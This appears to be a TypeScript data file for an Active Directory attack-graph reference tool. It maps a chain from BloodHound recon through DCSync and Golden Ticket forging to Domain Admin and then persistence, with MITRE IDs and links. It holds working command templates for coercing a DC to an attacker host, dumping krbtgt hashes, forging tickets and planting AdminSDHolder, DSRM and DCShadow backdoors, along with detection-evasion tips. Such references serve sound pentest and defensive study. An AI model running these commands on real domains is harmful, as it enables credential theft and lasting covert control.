import type { AttackEdge, TechniqueNodeDef } from '../schema';

const mitre = (id: string): { id: string; url: string } => ({
  id,
  url: `https://attack.mitre.org/techniques/${id.replace('.', '/')}/`,
});

/**
 * Chain 3 — "Recon the privilege graph → escalate → DCSync → Golden Ticket →
 * Domain Admin → persistence". `domain-admin` is the convergent goal node,
 * reachable via ACL abuse, DCSync, or a forged Golden Ticket.
 */
export const domainDominanceNodes: TechniqueNodeDef[] = [
  {
    id: 'bloodhound-recon',
    label: 'Attack-Path Mapping',
    phase: 'enumeration',
    summary: 'Graph the domain to find the shortest path to Domain Admin.',
    description:
      'Collect the AD graph — users, groups, sessions, ACLs, delegations — and compute attack paths from owned principals to high-value targets, turning blind enumeration into a directed plan. SharpHound / bloodhound-python collect the data, BloodHound analyses it, and PowerView / ldapdomaindump cover the same ground manually.',
    tools: [
      { name: 'bloodyAD', url: 'https://github.com/CravateRouge/bloodyAD' },
      { name: 'SharpHound', url: 'https://github.com/SpecterOps/SharpHound' },
      { name: 'BloodHound CE', url: 'https://github.com/SpecterOps/BloodHound' },
      { name: 'bloodhound-python', url: 'https://github.com/dirkjanm/BloodHound.py' },
      { name: 'PowerView', url: 'https://github.com/PowerShellMafia/PowerSploit' },
      { name: 'ldapdomaindump', url: 'https://github.com/dirkjanm/ldapdomaindump' },
    ],
    commands: [
      { label: 'bloodyAD', code: 'bloodyAD -u user -p pass -d domain.local --host dc01 get bloodhound', lang: 'bash' },
      {
        label: 'Collect from Linux',
        code: 'bloodhound-python -d domain.local -u user -p pass -c All -ns 10.0.0.1',
        lang: 'bash',
      },
    ],
    requires: ['Any valid domain account'],
    mitre: mitre('T1087.002'),
    references: [
      { label: 'HackTricks — Active Directory Methodology', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/index.html' },
      { label: 'The Hacker Recipes — BloodHound', url: 'https://www.thehacker.recipes/ad/recon/bloodhound/' },
    ],
    opsec: 'Full collection generates heavy LDAP traffic and many session queries. Use stealth collection methods and avoid collecting every method at once in monitored environments.',
    difficulty: 'easy',
  },
  {
    id: 'find-privesc-path',
    label: 'Privilege Escalation',
    phase: 'priv-esc',
    kind: 'category',
    summary: 'Routes from a domain user to higher privilege.',
    description:
      'The escalation hub: every way to climb from an ordinary domain account toward Domain Admin — ACL/DACL abuse, AD CS, Kerberos delegation, account/group manipulation, and critical CVEs. BloodHound usually shows which branch is shortest.',
  },
  {
    id: 'unconstrained-delegation',
    label: 'Unconstrained Delegation',
    phase: 'priv-esc',
    summary: 'Coerce a DC, capture its TGT.',
    description:
      'A host with unconstrained delegation stores the TGT of any user that authenticates to it. Coerce a Domain Controller to authenticate to a host you control (PetitPotam/PrinterBug), capture the DC\'s TGT, and impersonate it — a direct line to domain compromise.',
    tools: [
      { name: 'bloodyAD', url: 'https://github.com/CravateRouge/bloodyAD' },
      { name: 'Rubeus', url: 'https://github.com/GhostPack/Rubeus' },
      { name: 'Coercer', url: 'https://github.com/p0dalirius/Coercer' },
      { name: 'krbrelayx', url: 'https://github.com/dirkjanm/krbrelayx' },
    ],
    commands: [
      { label: 'bloodyAD', code: 'bloodyAD -u user -p pass -d domain.local --host dc01 add uac <target$> -f TRUSTED_FOR_DELEGATION', lang: 'bash' },
      {
        label: 'Monitor for incoming TGTs',
        code: 'Rubeus.exe monitor /interval:5 /nowrap',
        lang: 'powershell',
      },
      {
        label: 'Coerce the DC to authenticate',
        code: 'Coercer coerce -u user -p pass -t DC01 -l attacker_host',
        lang: 'bash',
      },
    ],
    requires: ['Admin on a host with unconstrained delegation', 'A coercion vector'],
    mitre: mitre('T1558'),
    opsec: 'Coercion (e.g. EfsRpc/PrinterBug) is increasingly detected and patched. Captured DC TGT enables Pass-the-Ticket as the DC.',
    difficulty: 'hard',
    references: [
      { label: 'HackTricks — Unconstrained Delegation', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/unconstrained-delegation.html' },
    ],
  },
  {
    id: 'dcsync',
    label: 'DCSync',
    phase: 'domain-dominance',
    summary: 'Replicate secrets — pull any hash, incl. krbtgt.',
    description:
      'With replication rights (DS-Replication-Get-Changes) you can ask a DC to hand over password hashes for any principal — including krbtgt and Domain Admins — by impersonating a domain controller. No code runs on the DC.',
    tools: [
      { name: 'bloodyAD', url: 'https://github.com/CravateRouge/bloodyAD' },
      { name: 'Mimikatz', url: 'https://github.com/gentilkiwi/mimikatz' },
      { name: 'secretsdump (Impacket)', url: 'https://github.com/fortra/impacket' },
    ],
    commands: [
      { label: 'bloodyAD', code: 'bloodyAD -u user -p pass -d domain.local --host dc01 add dcsync <attacker>', lang: 'bash' },
      {
        label: 'DCSync the krbtgt hash',
        code: 'secretsdump.py DOMAIN/user:pass@dc01 -just-dc-user krbtgt',
        lang: 'bash',
      },
      {
        label: 'Mimikatz DCSync',
        code: 'lsadump::dcsync /domain:domain.local /user:Administrator',
        lang: 'powershell',
      },
    ],
    requires: ['Replication rights (Domain Admin, DCSync ACL, or relayed LDAP)'],
    mitre: mitre('T1003.006'),
    opsec: 'Replication from a non-DC source is a high-fidelity detection (Event ID 4662 with the replication GUID). Source from an expected host if possible.',
    difficulty: 'medium',
    references: [
      { label: 'HackTricks — DCSync', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/dcsync.html' },
      { label: 'SpecterOps — BloodHound DCSync edge', url: 'https://bloodhound.specterops.io/resources/edges/dc-sync' },
    ],
  },
  {
    id: 'krbtgt-hash',
    label: 'krbtgt Hash',
    phase: 'domain-dominance',
    summary: 'The key to forge any Kerberos ticket.',
    description:
      'The krbtgt account signs every TGT in the domain. Possessing its hash lets you forge tickets for any user with any privileges — total, durable control of Kerberos auth.',
    requires: ['DCSync of krbtgt'],
    mitre: mitre('T1003.006'),
    difficulty: 'medium',
  },
  {
    id: 'golden-ticket',
    label: 'Golden Ticket',
    phase: 'domain-dominance',
    summary: 'Forge a TGT as anyone, anytime.',
    description:
      'Using the krbtgt hash, forge a Ticket-Granting-Ticket for an arbitrary (even non-existent) user with arbitrary group membership. It is accepted across the domain and survives most password resets — a Domain Admin equivalent and a persistence mechanism.',
    tools: [
      { name: 'Rubeus', url: 'https://github.com/GhostPack/Rubeus' },
      { name: 'ticketer (Impacket)', url: 'https://github.com/fortra/impacket' },
    ],
    commands: [
      {
        label: 'Forge a golden ticket',
        code: 'ticketer.py -nthash <krbtgt_hash> -domain-sid <SID> -domain domain.local Administrator',
        lang: 'bash',
      },
    ],
    requires: ['krbtgt hash', 'Domain SID'],
    mitre: mitre('T1558.001'),
    references: [
      { label: 'HackTricks — Golden Ticket', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/golden-ticket.html' },
      { label: 'The Hacker Recipes — Golden tickets', url: 'https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/golden' },
    ],
    opsec: 'Set realistic ticket lifetimes (default 10y golden tickets are an easy hunt). Mismatched RID/encryption is detectable.',
    difficulty: 'medium',
  },
  {
    id: 'domain-admin',
    label: 'Domain Admin',
    phase: 'domain-dominance',
    kind: 'goal',
    summary: '👑 Full control of the domain.',
    description:
      'You hold Domain Admin (or equivalent) — every host, every account, every secret. Reached here by ACL abuse, DCSync, or a forged Golden Ticket. The remaining branches establish durable persistence so access survives remediation.',
    requires: ['Any one of: DA-equivalent ACL, DCSync, or a Golden Ticket'],
    mitre: mitre('T1078.002'),
    difficulty: 'medium',
  },
  {
    id: 'adminsdholder',
    label: 'AdminSDHolder Backdoor',
    phase: 'persistence',
    summary: 'Stamp persistent rights on protected groups.',
    description:
      'The AdminSDHolder object\'s ACL is pushed to all protected groups every 60 minutes by SDProp. Add an ACE granting yourself control and it is silently re-applied to Domain Admins et al. even after a defender removes you.',
    tools: [
      { name: 'PowerView', url: 'https://github.com/PowerShellMafia/PowerSploit' },
      { name: 'Impacket dacledit', url: 'https://github.com/fortra/impacket' },
    ],
    commands: [
      {
        label: 'Add a persistent ACE to AdminSDHolder',
        code: "Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,...' -Rights All -PrincipalIdentity backdoor",
        lang: 'powershell',
      },
    ],
    requires: ['Domain Admin / write on AdminSDHolder'],
    mitre: mitre('T1098'),
    references: [
      { label: 'The Hacker Recipes — AdminSDHolder', url: 'https://www.thehacker.recipes/ad/persistence/adminsdholder' },
    ],
    opsec: 'The injected ACE is visible to anyone auditing protected-group ACLs; pair with a low-profile principal name.',
    difficulty: 'hard',
  },
  {
    id: 'dsrm',
    label: 'DSRM Abuse',
    phase: 'persistence',
    summary: 'Use the DC local admin as a backdoor.',
    description:
      'Every DC has a Directory Services Restore Mode local administrator. Dump its hash and flip the DsrmAdminLogonBehavior registry value so it can authenticate over the network — a stealthy, rarely-rotated DC backdoor.',
    tools: [{ name: 'Mimikatz', url: 'https://github.com/gentilkiwi/mimikatz' }],
    commands: [
      {
        label: 'Allow DSRM network logon',
        code: 'reg add "HKLM\\System\\CurrentControlSet\\Control\\Lsa" /v DsrmAdminLogonBehavior /t REG_DWORD /d 2',
        lang: 'powershell',
      },
    ],
    requires: ['Domain Admin / local admin on a DC'],
    mitre: mitre('T1078.001'),
    references: [
      { label: 'HackTricks — DSRM Credentials', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/dsrm-credentials.html' },
      { label: 'The Hacker Recipes — DSRM Persistence', url: 'https://www.thehacker.recipes/ad/persistence/dsrm' },
    ],
    opsec: 'Registry change on the DC is auditable; the DSRM account rarely logs on, so its use stands out if monitored.',
    difficulty: 'hard',
  },
  {
    id: 'dcshadow',
    label: 'DCShadow',
    phase: 'persistence',
    summary: 'Register a rogue DC, push stealth changes.',
    description:
      'Temporarily register a rogue domain controller and push arbitrary directory changes (e.g. SIDHistory, ACLs) via replication, bypassing most SIEM logging since the changes look like legitimate DC replication.',
    tools: [{ name: 'Mimikatz', url: 'https://github.com/gentilkiwi/mimikatz' }],
    commands: [
      {
        label: 'Push a change as a rogue DC',
        code: 'lsadump::dcshadow /object:target /attribute:sidHistory /value:<DA_SID>',
        lang: 'powershell',
      },
    ],
    requires: ['Domain Admin', 'Two processes (push + SYSTEM)'],
    mitre: mitre('T1207'),
    references: [
      { label: 'HackTricks — DCShadow', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/dcshadow.html' },
      { label: 'The Hacker Recipes — DC Shadow', url: 'https://www.thehacker.recipes/ad/persistence/dcshadow/' },
    ],
    opsec: 'Stealthier than direct edits because changes arrive via replication, but registering an nTDSDSA object briefly is detectable by replication-metadata monitoring.',
    difficulty: 'hard',
  },
];

export const domainDominanceEdges: AttackEdge[] = [
  // Enumeration (BloodHound) and the privilege-escalation categories now hang
  // off valid-domain-creds directly (see ad-categories.ts) — BloodHound no
  // longer gates escalation. Escalation techniques converge here:
  { source: 'unconstrained-delegation', target: 'pass-the-ticket', label: 'captured DC TGT' },
  { source: 'unconstrained-delegation', target: 'dcsync' },
  { source: 'dcsync', target: 'krbtgt-hash' },
  { source: 'dcsync', target: 'pass-the-hash', label: 'any account hash' },
  { source: 'dcsync', target: 'domain-admin', label: 'dump DA hash' },
  { source: 'krbtgt-hash', target: 'golden-ticket' },
  { source: 'bloodhound-recon', target: 'find-privesc-path', label: 'pick a path' },
  { source: 'golden-ticket', target: 'domain-admin' },
  // domain-admin -> adminsdholder/dsrm/dcshadow now route through the
  // 'Persistence' category (see ad-categories.ts).
];
